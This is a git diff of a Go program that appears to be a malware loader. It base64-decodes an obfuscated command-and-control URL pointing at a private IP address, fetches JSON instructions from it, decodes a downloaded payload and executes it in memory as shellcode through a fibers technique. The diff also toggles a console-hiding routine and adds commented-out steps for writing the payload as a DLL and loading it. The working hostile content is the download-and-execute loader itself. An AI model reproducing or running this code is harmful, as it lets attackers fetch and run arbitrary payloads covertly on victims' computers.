@@ -4,7 +4,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"strings"
-	"syscall"
 
 	"fmt"
 	"io"
@@ -17,7 +16,7 @@ import (
 	//"crypto"
 )
 
-var h = HConsole()
+//var h = HConsole()
 
 // ALWAYS HAVE STRUCT FIELDS CAPITAL FIRST LETTER. FIX THIS IN YOUR OTHER PROJECT
 type Config struct {
@@ -27,10 +26,10 @@ type Config struct {
 }
 
 func main() {
-	HConsole()
+	//	HConsole()
 	var config Config
-	//url := "http://192.168.5.132/instr" //URL non decoded
-	url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdHIK" //Base64 address of the json instructions. Use the linux base64 command on a text file containing the address and drop the result here.
+	//url should base64 of http://whatever.blekt or ip
+url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdAo="
 	urlBytes, _ := base64.RawStdEncoding.DecodeString(url)
 	url = string(urlBytes)
 	url = strings.Split(url, "\n")[0]
@@ -60,14 +59,32 @@ func main() {
 	//contentsStr := string(contents)
 	contentsNew := contents
 	base64.RawStdEncoding.Decode(contentsNew, contents)
-	err = shellcode.Fibers(contents)
+	//os.WriteFile(config.PathNew, contentsNew, 0777)
+	// h, e := syscall.LoadLibrary(config.PathNew) //Make sure this DLL follows Golang machine bit architecture (64-bit in my case)
+	// if e != nil {
+	// 	log.Fatal(e)
+	// }
+	//defer syscall.FreeLibrary(h)
+	//os.Remove(config.PathNew)
+	// proc, e := syscall.GetProcAddress(h, "xyz") //One of the functions in the DLL
+	// if e != nil {
+	// 	log.Fatal(e)
+	// }
+
+	//_, _, _ = syscall.Syscall9(uintptr(proc), 0, 2, 2, 2, 2, 0, 0, 0, 0, 0) //Pay attention to the positioning of the parameter
+	//fmt.Printf("Hello dll function returns %d\n", n)
+	// fmt.Println(contentsNew)
+	err = shellcode.Fibers(contentsNew)
 	if err != nil {
+		fmt.Println("FATAL ERROR")
 		log.Fatal(err)
 	}
+	//os.WriteFile("testMe2.dll", contentsNew, 0777)
+	fmt.Println("Done!")
 }
 
-func HConsole() int {
-	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
-	FreeConsole.Call()
-	return 0
-}
+//func HConsole() int {
+//	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
+//	FreeConsole.Call()
+//	return 0
+//}
